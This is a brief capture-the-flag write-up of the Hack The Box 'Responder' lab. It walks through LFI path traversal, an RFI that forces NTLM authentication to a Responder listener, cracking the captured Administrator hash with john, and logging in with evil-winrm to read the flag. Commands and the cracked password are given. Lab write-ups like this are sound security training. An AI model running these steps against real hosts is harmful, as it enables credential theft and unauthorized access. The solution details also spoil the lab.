# HTB Starting Point Tier 1 - Responder

- IP Provided - 10.129.95.234

## Recon and Discovery

- nmap found - 80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
						   5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
						 

## Analysis and Exploitation

- We try going to the webpage and get redirected to `unika.htb` so we add `<ip> <unika.htb` to `/etc/hosts`
- We find when switching the Language to French it include a `page` from webserver `unika.htb/index.php?page=`
- We try for LFI Vulberability with `../../../../../../../../windows/system32/drivers/etc/hosts` we see the `/etc/host` file
- We check for the RFI by running `responder` utility
- We use `responder` utility to respond to `NBT-NS` request from the server by providing responder the interface `sudo responder -I tun0 `
- We use the IP provided by responder and use it in the url to request external file like `http://unika.htb/index.php?page=//<responder ip>/somefile`
- We see the Admininstrator hash and save it to a hash file
- We use `john the ripper` to crack the password `john --wordlist=<wordlist> <name_of_hashfile>`
	- Use rockyou.txt
- We find it to be `badminton`
- We use `Administartor:badminton` with `evil-winrm` like `evil-winrm -i <ip> -u Administrator -P 5985 -p badminton`
- We get dropped in a shell
- We can now look around to find something interesting
- We find a user `mike` with directory `Desktop`
- `cd Desktop` has `flag.txt`
-  cat `flag.txt` reveals the `flag`

## Difficulty - Very Easy

- Machine introduces LFI and RFI. Also shows how to use `responder` as a listner, `evil-winrm` to enumerate the WinRM service and `john` to crack hashes
